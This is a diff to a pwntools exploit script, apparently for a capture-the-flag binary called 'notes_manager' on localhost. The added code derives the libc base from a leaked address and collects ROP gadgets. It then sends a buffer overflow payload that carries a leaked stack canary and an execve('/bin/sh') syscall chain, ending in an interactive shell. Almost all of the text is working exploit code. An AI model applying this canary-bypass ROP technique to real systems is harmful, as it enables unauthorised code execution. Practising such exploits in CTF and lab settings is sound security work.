@@ -6,6 +6,7 @@ from pwn import *
 
 # Set up pwntools for the correct architecture
 exe = context.binary = ELF(args.EXE or 'notes_manager')
+libc = ELF('./libc.so.6')
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -16,6 +17,8 @@ exe = context.binary = ELF(args.EXE or 'notes_manager')
 
 def start(argv=[], *a, **kw):
     '''Start the exploit against the target.'''
+    if args.REMOTE:
+        return remote('localhost',1337)
     if args.GDB:
         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
     else:
@@ -59,7 +62,35 @@ io.recvline()
 an = io.recvuntil(b'Choos').replace(b'Choos', b'')
 log.warn(an)
 log.warn(f'LENGTH -> {len(an)}')
-libc_start = u64(an.ljust(8,b'\x00')))
+libc_start = u64(an.ljust(8,b'\x00'))
+log.warn(f'LIBC START -> {libc_start:x}')
+
+libc.address = libc_start - 171408
+log.warn(f'LIBC -> {libc.address:x}')
+
+rop = ROP(libc)
+bin_sh = next(libc.search(b'/bin/sh\x00'))
+pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+pop_rdx = rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]
+pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
+
+syscall = rop.find_gadget(['syscall', 'ret'])[0]
+ret = rop.find_gadget(['ret'])[0]
+
+pl = b''
+pl += b'a'*72
+pl += b'\x00' + leak
+pl += p64(0xdeadbeef)
+pl += p64(ret)
+pl += p64(pop_rax) + p64(59)
+pl += p64(pop_rdi) + p64(bin_sh)
+pl += p64(pop_rsi) + p64(0)
+pl += p64(pop_rdx) + p64(0) + p64(0)
+pl += p64(syscall)
+
+io.sendline(b'1')
+io.sendline(pl)
 
 io.interactive()
 
